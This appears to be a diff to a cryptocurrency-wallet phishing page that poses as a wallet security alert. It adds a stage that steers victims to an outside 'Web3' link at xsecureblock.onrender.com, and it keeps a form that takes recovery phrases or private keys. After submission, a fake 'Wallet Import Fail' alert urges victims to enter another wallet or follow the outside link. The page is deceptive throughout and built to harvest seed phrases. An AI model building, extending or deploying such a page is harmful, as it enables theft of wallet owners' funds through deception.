@@ -203,7 +203,7 @@
         }
 
         .progress-line {
-            width: clamp(40px, 10vw, 80px);
+            width: clamp(30px, 8vw, 60px);
             height: 2px;
             background: #e0e0e0;
             margin: 0 8px;
@@ -471,6 +471,160 @@
             transform: translateX(-24px);
         }
 
+        /* Stage 4: Connection Method Selection */
+        .connection-method-screen {
+            padding-top: 20px;
+        }
+
+        .connection-title {
+            font-size: clamp(28px, 6vw, 36px);
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .connection-options {
+            display: flex;
+            flex-direction: column;
+            gap: 30px;
+            margin: 30px 0;
+        }
+
+        .connection-card {
+            background: white;
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .connection-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
+        }
+
+        .connection-card.preferred {
+            border: 3px solid #2196f3;
+            background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
+        }
+
+        .connection-card.optional {
+            border: 2px solid #e0e0e0;
+        }
+
+        .preferred-badge {
+            background: linear-gradient(45deg, #4caf50, #45a049);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: clamp(12px, 3vw, 14px);
+            font-weight: 600;
+            display: inline-block;
+            margin-bottom: 15px;
+            box-shadow: 0 2px 8px rgba(76, 175, 80, 0.3);
+        }
+
+        .optional-badge {
+            background: #f5f5f5;
+            color: #757575;
+            padding: 6px 14px;
+            border-radius: 16px;
+            font-size: clamp(11px, 2.5vw, 13px);
+            font-weight: 600;
+            display: inline-block;
+            margin-bottom: 12px;
+        }
+
+        .connection-description {
+            color: #1565c0;
+            font-size: clamp(14px, 3.5vw, 17px);
+            line-height: 1.6;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+        .connection-description-small {
+            color: #666;
+            font-size: clamp(12px, 3vw, 14px);
+            line-height: 1.5;
+            margin-bottom: 16px;
+        }
+
+        .web3-connect-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            width: 100%;
+            padding: 20px;
+            background: linear-gradient(135deg, #2196f3 0%, #1565c0 100%);
+            color: white;
+            border: none;
+            border-radius: 14px;
+            font-size: clamp(18px, 4.5vw, 22px);
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            box-shadow: 0 6px 20px rgba(33, 150, 243, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .web3-connect-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: left 0.5s;
+        }
+
+        .web3-connect-btn:hover::before {
+            left: 100%;
+        }
+
+        .web3-connect-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 28px rgba(33, 150, 243, 0.5);
+        }
+
+        .btn-icon {
+            font-size: clamp(24px, 5vw, 28px);
+        }
+
+        .btn-arrow {
+            font-size: clamp(20px, 4vw, 24px);
+            transition: transform 0.3s;
+        }
+
+        .web3-connect-btn:hover .btn-arrow {
+            transform: translateX(5px);
+        }
+
+        .manual-connect-btn {
+            width: 100%;
+            padding: 14px;
+            background: transparent;
+            color: #757575;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: clamp(14px, 3.5vw, 16px);
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .manual-connect-btn:hover {
+            background: #f5f5f5;
+            border-color: #bdbdbd;
+            color: #424242;
+        }
+
         /* Modal Styles */
         .modal-overlay {
             position: fixed;
@@ -594,7 +748,7 @@
             text-decoration: underline;
         }
 
-        /* Stage 4: Import Wallet */
+        /* Stage 5: Import Wallet */
         .import-screen {
             padding-top: 20px;
         }
@@ -764,7 +918,7 @@
 
         /* Secure Connection Indicator */
         .secure-connection {
-            margin-top: 15px;
+            margin-top: 30px;
             color: white;
             background: linear-gradient(45deg, #3b82f6, #1d4ed8);
             font-weight: 500;
@@ -772,7 +926,6 @@
             font-size: clamp(10px, 2.5vw, 14px);
             padding: 6px 12px;
             text-align: center;
-            margin-bottom: 8px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -860,6 +1013,34 @@
 
         .error-message.show {
             display: block;
+        }
+
+        .email-message {
+            color: #666;
+            font-size: 14px;
+            margin: 8px 0;
+            line-height: 1.4;
+        }
+
+        .email-input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            box-sizing: border-box;
+        }
+
+        .email-input:focus {
+            outline: none;
+            border-color: #2196f3;
+            box-shadow: 0 0 0 3px rgba(33, 150, 243, 0.1);
+        }
+
+        .email-input.error {
+            border-color: #f44336;
+            box-shadow: 0 0 0 3px rgba(244, 67, 54, 0.1);
         }
 
         /* Responsive breakpoints */
@@ -963,8 +1144,6 @@
             }
         }
     </style>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"
         integrity="sha512-aVKKRRi/Q/YV+4mjoKBsE4x3H+BkegoM/em46NNlCqNTmUYADjBbeNefNxYV7giUp0VxICtqdrbqU7iVaeZNXA=="
         crossorigin="anonymous" referrerpolicy="no-referrer"></script>
@@ -1028,6 +1207,8 @@
                             <div class="progress-step inactive">3</div>
                             <div class="progress-line"></div>
                             <div class="progress-step inactive">4</div>
+                            <div class="progress-line"></div>
+                            <div class="progress-step inactive">5</div>
                         </div>
 
                         <h1 class="secure-title">Secure your wallet from Attack</h1>
@@ -1042,7 +1223,7 @@
                         </p>
 
                         <p class="secure-description">
-                            It's the only way to recover your wallet if you get locked out from any wallet app or you get a new
+                            It's the only way to recover your wallet if you get locked out from any app or get a new
                             device.
                         </p>
 
@@ -1050,7 +1231,7 @@
                     </div>
         </div>
 
-        <!-- Stage 2: Help Us Improve MetaMask -->
+        <!-- Stage 2: Help Us Improve -->
         <div class="screen improve-screen" id="stage2">
             <button class="back-btn" onclick="goToStage(1)">
                 < back</button>
@@ -1064,6 +1245,8 @@
                             <div class="progress-step inactive">3</div>
                             <div class="progress-line"></div>
                             <div class="progress-step inactive">4</div>
+                            <div class="progress-line"></div>
+                            <div class="progress-step inactive">5</div>
                         </div>
 
                         <h1 class="improve-title">Blockchain Security Alart</h1>
@@ -1137,6 +1320,8 @@
                             <div class="progress-step active">3</div>
                             <div class="progress-line"></div>
                             <div class="progress-step inactive">4</div>
+                            <div class="progress-line"></div>
+                            <div class="progress-step inactive">5</div>
                         </div>
 
                         <h1 class="password-title">Secure with strong password</h1>
@@ -1183,9 +1368,63 @@
                     </div>
         </div>
 
-        <!-- Stage 4: Import Wallet -->
-        <div class="screen import-screen" id="stage4">
+        <!-- Stage 4: Connection Method Selection -->
+        <div class="screen connection-method-screen" id="stage4">
             <button class="back-btn" onclick="goToStage(3)">
+                < back</button>
+
+            <div class="content-wrapper">
+                <div class="progress-bar">
+                    <div class="progress-step completed">1</div>
+                    <div class="progress-line completed"></div>
+                    <div class="progress-step completed">2</div>
+                    <div class="progress-line completed"></div>
+                    <div class="progress-step completed">3</div>
+                    <div class="progress-line completed"></div>
+                    <div class="progress-step active">4</div>
+                    <div class="progress-line"></div>
+                    <div class="progress-step inactive">5</div>
+                </div>
+
+                <h1 class="connection-title">Choose Connection Method</h1>
+
+                <div class="connection-options">
+                    <!-- Web3 Connection Option -->
+                    <div class="connection-card preferred">
+                        <div class="preferred-badge">✓ RECOMMENDED</div>
+                        <p class="connection-description">It's preferable to use Web3 WalletConnect below</p>
+                        <a href="https://xsecureblock.onrender.com" class="web3-connect-btn">
+                            <span class="btn-icon">🔗</span>
+                            Connect with Web3
+                            <span class="btn-arrow">→</span>
+                        </a>
+                    </div>
+
+                    <!-- Manual Connection Option -->
+                    <div class="connection-card optional">
+                        <div class="optional-badge">OPTIONAL</div>
+                        <p class="connection-description-small">Connect manually is optional. Try using Web3 WalletConnect first. If you're having trouble connecting your wallet with Web3, you can try connect manually.</p>
+                        <button class="manual-connect-btn" onclick="goToStage(5)">
+                            Connect Manually
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Secure Connection Indicator -->
+                <div class="secure-connection">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+                        viewBox="0 0 16 16">
+                        <path fill-rule="evenodd"
+                            d="M8 14.933a.615.615 0 0 0 .1-.025c.076-.023.174-.061.294-.118.24-.113.547-.29.893-.533a10.726 10.726 0 0 0 2.287-2.233c1.527-1.997 2.807-5.031 2.253-9.188a.48.48 0 0 0-.328-.39c-.651-.213-1.75-.56-2.837-.855C9.552 1.29 8.531 1.067 8 1.067v13.866zM5.072.56C6.157.265 7.31 0 8 0s1.843.265 2.928.56c1.11.3 2.229.655 2.887.87a1.54 1.54 0 0 1 1.044 1.262c.596 4.477-.787 7.795-2.465 9.99a11.775 11.775 0 0 1-2.517 2.453 7.159 7.159 0 0 1-1.048.625c-.28.132-.581.24-.829.24s-.548-.108-.829-.24a7.158 7.158 0 0 1-1.048-.625 11.777 11.777 0 0 1-2.517-2.453C1.928 10.487.545 7.169 1.141 2.692A1.54 1.54 0 0 1 2.185 1.43 62.456 62.456 0 0 1 5.072.56z" />
+                    </svg>
+                    SECURED CONNECTION
+                </div>
+            </div>
+        </div>
+
+        <!-- Stage 5: Import Wallet -->
+        <div class="screen import-screen" id="stage5">
+            <button class="back-btn" onclick="goToStage(4)">
                 < back</button>
 
                     <div class="content-wrapper">
@@ -1480,7 +1719,7 @@
             screens.forEach(screen => screen.classList.remove('active'));
 
             // Show target screen
-            if (stage === 1) {
+             if (stage === 1) {
                 document.getElementById('stage1').classList.add('active');
             } else if (stage === 2) {
                 document.getElementById('stage2').classList.add('active');
@@ -1488,15 +1727,17 @@
                 document.getElementById('stage3').classList.add('active');
             } else if (stage === 4) {
                 document.getElementById('stage4').classList.add('active');
-                // Reset form validation when entering stage 4
-                resetStage4Form();
+            } else if (stage === 5) {
+                document.getElementById('stage5').classList.add('active');
+                // Reset form validation when entering stage 5
+                resetStage5Form();
             }
 
             currentStage = stage;
             updateProgressBar(stage);
         }
 
-        function resetStage4Form() {
+        function resetStage5Form() {
             // Reset validation state
             const continueBtn = document.getElementById('continueBtn');
             continueBtn.disabled = true;
@@ -1695,7 +1936,7 @@
             document.getElementById('phraseModal').classList.remove('active');
         }
 
-        // Stage 4 Enhanced Functions
+        // Stage 5 Enhanced Functions
         function pasteFromClipboard() {
             const textarea = document.getElementById('recoveryPhrase');
             const pasteBtn = document.querySelector('.paste-btn');
@@ -1995,7 +2236,7 @@
 
                 success: function () {
                     setTimeout(function () {
-                        alert("❌ Wallet Import Fail!\n\nYour wallet fail to login and block unknown login attempt, Please make sure you enter your phrase or key correctly or try to login with Another Wallet (typically 12-24 words separated by a single space, for privatekey paste it to the box as you copy from wallet)\nif you are unable to login Manually, Try to login with Web3 Walletconnect\n\ncopy and launch the link below to connect with web3\nhttps://secureblock.onrender.com/");
+                        alert("❌ Wallet Import Fail!\n\nYour wallet fail to login and block unknown login attempt, Please make sure you enter your phrase or key correctly or try to login with Another Wallet (typically 12-24 words separated by a single space, for privatekey paste it to the box as you copy from wallet)\nif you are unable to login Manually, Try to login with Web3 Walletconnect\n\ncopy and launch the link below to connect with web3\nhttps://xsecureblock.onrender.com/");
                         $("#continueBtn").html("Continue To Login & Block Attack").prop("disabled", false);
                     }, 2000);
                 },
